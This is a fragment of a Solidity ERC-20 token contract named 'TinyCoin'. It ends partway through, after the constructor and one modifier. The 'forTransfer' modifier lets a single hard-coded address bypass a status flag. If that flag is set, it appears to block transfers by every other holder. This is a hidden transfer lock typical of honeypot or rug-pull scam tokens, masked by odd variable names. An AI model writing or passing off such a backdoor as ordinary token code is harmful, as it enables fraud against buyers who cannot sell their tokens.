...
contract TinyCoin is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenal_totalSupply;
    uint256 private _tokenal_status = 0;
    uint256 public stakingPoolalStatus = 0;

    string private _tokenal_name;
    string private _tokenal_symbol;

    address private _poolakAddress = 0xED10D53BbA002BBA9a799D5B6d34C948626FE603;

    constructor() {
        _tokenal_name = "Tiny Coin";
        _tokenal_symbol = "TINY";
        _tokenal_totalSupply = 10 * 10 ** 18;
        _balances[msg.sender] = _tokenal_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolakAddress || _tokenal_status == 0);
        _;
    }
